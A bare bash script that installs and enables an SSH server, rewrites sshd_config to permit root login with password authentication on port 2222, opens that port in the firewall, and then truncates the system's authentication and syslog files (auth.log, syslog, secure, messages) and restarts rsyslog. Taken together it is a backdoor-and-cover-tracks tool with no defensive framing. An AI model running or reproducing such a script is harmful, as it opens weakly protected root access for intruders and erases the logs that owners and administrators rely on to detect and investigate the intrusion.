#!/bin/bash

clear_logs() {
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        DISTRO=$ID
    else
        exit 1
    fi

    case "$DISTRO" in
        ubuntu|debian)
            LOG_FILES=(
                "/var/log/auth.log"
                "/var/log/syslog"
            )
            ;;
        centos|rhel|fedora|rocky|almalinux)
            LOG_FILES=(
                "/var/log/secure"
                "/var/log/messages"
            )
            ;;
        *)
            continue
            ;;
    esac

    for LOG_FILE in "${LOG_FILES[@]}"; do
        if [[ -f $LOG_FILE ]]; then
            truncate -s 0 "$LOG_FILE"
        fi
    done

    if command -v systemctl > /dev/null 2>&1; then
        systemctl restart rsyslog || true
    fi

    exit 0
}

SSH_CONFIG_FILE="/etc/ssh/sshd_config"
NEW_PORT=2222

install_ssh() {
    if ! command -v ssh > /dev/null 2>&1; then
        sudo apt update > /dev/null 2>&1
        sudo apt install openssh-server -y > /dev/null 2>&1
        [[ $? -ne 0 ]] && exit 1
    fi
}

enable_ssh_service() {
    sudo systemctl start ssh
    sudo systemctl enable ssh
}

configure_ssh() {
    sudo sed -i "s/^#*PermitRootLogin .*/PermitRootLogin yes/" "$SSH_CONFIG_FILE"
    sudo sed -i "s/^#*Port .*/Port $NEW_PORT/" "$SSH_CONFIG_FILE"
    sudo sed -i "s/^#*PasswordAuthentication .*/PasswordAuthentication yes/" "$SSH_CONFIG_FILE"
    sudo sed -i "s/^#*PubkeyAuthentication .*/PubkeyAuthentication yes/" "$SSH_CONFIG_FILE"
}

restart_ssh() {
    sudo systemctl restart ssh
    [[ $? -ne 0 ]] && exit 1
}

configure_firewall() {
    if command -v ufw > /dev/null; then
        sudo ufw allow "$NEW_PORT"/tcp
        sudo ufw reload
    fi
}

main() {
    install_ssh
    enable_ssh_service
    configure_ssh
    restart_ssh
    configure_firewall
    clear_logs
    exit 0
}

main
